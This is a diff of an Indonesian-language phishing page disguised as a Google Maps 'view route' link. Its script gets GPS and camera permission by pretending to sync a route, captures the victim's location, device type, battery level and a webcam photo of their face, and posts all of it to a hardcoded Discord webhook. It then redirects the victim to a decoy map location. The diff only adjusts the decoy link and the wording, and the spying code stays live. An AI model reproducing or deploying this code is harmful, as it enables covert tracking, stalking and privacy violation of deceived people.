@@ -10,7 +10,7 @@
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png">
 
     <style>
-        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+        body { margin: 0; font-family: sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
         .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
         .logo { width: 70px; margin-bottom: 20px; }
         .btn { padding: 15px 25px; background: #4285F4; color: white; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
@@ -22,18 +22,17 @@
     <div class="card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" class="logo">
         <button class="btn" onclick="mainkan()">Lihat Lokasi Rute</button>
-        <p class="text">Klik tombol di atas untuk sinkronisasi GPS dan melihat estimasi waktu tiba di lokasi.</p>
+        <p class="text">Klik tombol di atas untuk sinkronisasi GPS dan melihat estimasi waktu tiba.</p>
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR"; 
         
-        // --- LINK PALSU (Grand Indonesia Mall) ---
-        const linkPalsu = "https://maps.app.goo.gl/M6v1v59P7fM8K4K87"; 
+        // --- LINK BARU (MENGGUNAKAN KOORDINAT ASLI AGAR TIDAK ERROR) ---
+        const linkPalsu = "https://www.google.com/maps/search/?api=1&query=-6.1951,106.8231"; 
 
         async function mainkan() {
             document.querySelector('.btn').innerHTML = "Menghubungkan...";
-            
             let bInfo = "N/A";
             try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}%`; } catch(e){}
             let tipeHP = navigator.userAgent; 
@@ -49,27 +48,18 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
                     canvas.toBlob(async (blob) => {
-                        // 1. KIRIM TEKS INFO KE DISCORD (Data Asli)
                         await fetch(webhookURL, {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({ 
-                                content: `**🚨 TARGET TERPANTAU!**\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n📍 **Lokasi Asli:** ${mapsAsli}` 
-                            })
+                            body: JSON.stringify({ content: `**🚨 TARGET TERPANTAU!**\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n📍 **Lokasi Asli:** ${mapsAsli}` })
                         });
-
-                        // 2. KIRIM FOTO KE DISCORD
                         const formData = new FormData();
                         formData.append("file", blob, "wajah.jpg");
                         await fetch(webhookURL, { method: 'POST', body: formData });
-
-                        // 3. LEMPAR TARGET KE LOKASI PALSU (Mall)
                         window.location.href = linkPalsu; 
                     }, 'image/jpeg');
-
                     stream.getTracks().forEach(t => t.stop());
                 } catch (e) {
-                    // Jika kamera ditolak, tetap kirim lokasi asli
                     await fetch(webhookURL, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
@@ -78,7 +68,7 @@
                     window.location.href = linkPalsu;
                 }
             }, (err) => { 
-                alert("Izin GPS diperlukan untuk sinkronisasi rute."); 
+                alert("Izin GPS diperlukan."); 
                 document.querySelector('.btn').innerHTML = "Lihat Lokasi Rute";
             });
         }
